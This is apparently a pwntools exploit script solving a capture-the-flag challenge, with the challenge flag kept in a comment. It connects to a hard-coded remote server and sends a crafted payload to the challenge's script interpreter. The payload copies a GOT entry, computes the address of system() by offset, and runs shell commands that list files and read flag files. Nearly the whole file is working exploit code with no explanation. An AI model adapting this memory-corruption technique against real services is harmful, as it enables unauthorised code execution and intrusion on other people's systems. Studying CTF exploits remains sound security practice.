#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.6"
#port = 9999
host = "146.185.168.172"
port = 54517
r = remote(host,port)

#ASIS{Eng1ne_0n_Pr0p311er_C0nnect3d}
start_main_got = 0x604ff0
dest = 0x6056d8
src = start_main_got
size = 8
memcpy = 0x4007c0
off = 0x24c50
cmd = 0x6075e0
payload = "var kkk = 56746;func memcpy(o,p,q,r){};memcpy(" +str(dest) + "," + str(src)+ "," +str(size)+",4);var ss = " +str(memcpy) +";print ss;B();"
payload += "var system = kkk + " + str(off) +";func win(a,b,c,d){};win(" + str(cmd) + ",2,3,4);print system;B();"
payload = payload.ljust(0x200,"\x41") + "ls -la;cat /home/`whoami`/flag;cat flag;cat /flag\x00"
payload = payload.ljust(0x2bc,"\x42")

r.recvuntil(":D")
r.send(payload)
r.interactive()
